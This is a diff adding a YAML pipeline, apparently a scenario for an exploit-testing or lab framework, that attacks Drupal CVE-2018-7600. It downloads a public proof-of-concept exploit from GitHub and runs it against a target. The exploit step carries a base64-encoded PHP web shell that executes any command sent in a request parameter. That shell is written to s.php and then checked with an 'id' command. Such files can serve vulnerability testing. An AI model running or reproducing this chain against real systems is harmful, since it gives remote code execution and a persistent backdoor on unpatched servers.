@@ -1,0 +1,27 @@
+name: Drupal CVE-2018-7600
+params:
+  - name: target_port
+    description: Web server port
+    type: int
+    default: 8080
+
+workspace:
+  - target: exploit.py
+    source: https://raw.githubusercontent.com/g0rx/CVE-2018-7600-Drupal-RCE/master/poc5-shlacky.py
+
+steps:
+  - name: Check available
+    image: curlimages/curl:latest
+    commands:
+      - curl -f -v --output /dev/null http://${target_host}:${target_port}/
+
+  - name: Exploit
+    image: python:2.7
+    commands:
+      - pip install requests
+      - python exploit.py -t http://${target_host}:${target_port} -c 'echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbImMiXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsiYyJdIC4gIiAyPiYxIiApOyB9 | base64 -d | tee s.php'
+
+  - name: Check exploit result
+    image: curlimages/curl:latest
+    commands:
+      - curl -f -v http://${target_host}:${target_port}/s.php?c=id
